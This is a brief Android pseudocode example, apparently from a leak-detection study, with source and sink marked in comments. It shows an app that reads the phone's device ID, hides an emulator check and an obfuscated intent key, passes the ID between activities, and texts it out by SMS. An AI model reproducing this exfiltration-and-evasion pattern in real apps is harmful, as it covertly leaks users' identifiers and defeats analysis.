//TelephonyManager telMnger; (default)
//SmsManager sms; (default)
class Activity1 extends Activity{
	void onCreate(Bundle state){
    	Button to2 = (Button) findViewById(to2a);
        if(antiemulator()) return;
        to2.setOnClickListener(new OnClickListener(){
        	void onClick(View v){
	            //source 
            	String id = telMnger.getDeviceId();
                Intent i = new Intent(Activity1.this, Activity2.class);     				   i.putExtra(decrypt("BarIta*9scan"), id);
                //ICC communication
                Activity.this.startActivity(i);
}});}}
class Activity2 extends Activity{
	void onStart(){
    	Intent i = getIntent();
        String s = i.getStringExtra(decrypt("BarIta*9scan"));
        //sink
        sms.sendTextMessage(number, null, s, null, null);
}}